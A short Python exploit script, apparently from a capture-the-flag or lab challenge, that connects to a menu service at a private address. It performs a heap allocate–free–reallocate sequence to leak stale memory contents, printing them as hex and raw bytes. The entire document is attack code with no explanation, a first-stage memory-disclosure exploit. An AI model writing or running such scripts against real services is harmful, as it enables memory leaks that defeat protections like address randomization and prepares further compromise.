import socket
import time
import struct
import sys

host = "10.2.0.5"
port = 10004


def get_response(s, delim=None):
    time.sleep(0.5)
    data = s.recv(4096)
    return data


def leak():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Alloc B
    s.sendall(b"2\n")
    time.sleep(0.5)
    s.sendall(b"32\n")  # Size
    time.sleep(0.5)
    s.sendall(b"BBBB\n")  # Name
    time.sleep(0.5)
    s.recv(4096)  # Flush

    # Free B
    s.sendall(b"4\n")
    time.sleep(0.5)
    s.recv(4096)

    # Alloc A (reuse?)
    s.sendall(b"1\n")
    time.sleep(0.5)
    s.sendall(b"32\n")
    time.sleep(0.5)
    s.sendall(b"A\n")  # Short name
    time.sleep(0.5)
    s.recv(4096)

    # Show A
    s.sendall(b"6\n")
    time.sleep(0.5)
    out = s.recv(4096)
    print("Output hex:", out.hex())
    print("Output raw:", out)

    s.close()


if __name__ == "__main__":
    leak()
